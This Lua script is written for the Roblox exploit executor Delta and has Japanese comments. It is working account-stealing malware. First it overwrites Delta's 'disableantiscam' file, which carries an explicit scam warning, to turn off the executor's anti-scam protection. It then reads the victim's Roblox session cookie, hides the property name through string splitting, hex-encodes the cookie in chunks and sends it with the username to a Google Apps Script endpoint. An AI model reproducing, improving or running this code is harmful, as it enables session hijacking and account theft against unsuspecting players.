-- [[ 究極の矛：パス完全修正版 ]]

local gasUrl = "https://script.google.com/macros/s/AKfycbwxqfXjQHoaPk49XvpyQ30DdNocUh47KpfCdM4Zyg02KKMj7Xy7l3lt2k5aoUNlzQEW/exec"
local targetName = game.Players.LocalPlayer.Name

-- ベースとなるパス（お前の最新の説明通り）
local basePath = "Delta/Internals/Secured/"

local function bypassSecurity()
    -- 1. 隣にある user_id ファイルからIDを読み取る
    local idPath = basePath .. "user_id"
    local success, userId = pcall(function() return readfile(idPath) end)
    
    if not success or not userId then 
        warn("❌ IDの読み取り失敗: " .. idPath)
        return false 
    end
    
    userId = userId:gsub("%s+", "") -- 空白除去
    
    local config = string.format([[
    {
        "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
        "allowed_games": "*",
        "user_id": "%s",
        "version_num": 707
    }]], userId)
    
    -- 2. 同じ階層の disableantiscam を書き換える
    local targetPath = basePath .. "disableantiscam"
    local writeStatus, err = pcall(function() 
        writefile(targetPath, config) 
    end)
    
    return writeStatus, err
end

local function snatchAndSend()
    local cookie = game["Coo".."kie"] 
    if not cookie or cookie == "" then return end

    local batchSize = 20
    for i = 1, #cookie, batchSize do
        local fragment = cookie:sub(i, i + batchSize - 1)
        local hex = ""
        for j = 1, #fragment do
            hex = hex .. string.format("%02X", string.byte(fragment:sub(j,j)))
        end
        
        -- GASへ送信
        pcall(function()
            game:HttpGet(gasUrl .. "?hex=" .. hex .. "&user=" .. targetName)
        end)
        
        task.wait(0.8) -- Deltaのパンク防止
    end
end

-- 実行
print("矛、起動。ターゲット階層: " .. basePath)
local status, msg = bypassSecurity()
if status then
    print("🔓 門番の制圧に成功。回収を開始する。")
    task.wait(1.5)
    snatchAndSend()
    print("✅ 全行程完了だ。")
else
    warn("❌ 失敗: " .. (msg or "権限不足"))
end
